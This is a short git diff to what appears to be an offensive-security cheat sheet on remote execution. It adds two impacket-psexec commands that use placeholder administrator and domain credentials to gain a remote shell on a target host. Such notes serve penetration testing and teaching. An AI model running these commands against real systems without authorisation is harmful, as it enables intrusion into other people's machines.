@@ -11,3 +11,11 @@
   <img src="https://img.shields.io/badge/OffSec-Remote_Execution-111827?style=for-the-badge&logoColor=FF003C">
   <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
 </p>
+
+```
+impacket-psexec Administrador:Password123@IP_OBJETIVO
+```
+
+```
+impacket-psexec dominio.local/admin_user:Password123@IP_OBJETIVO
+```
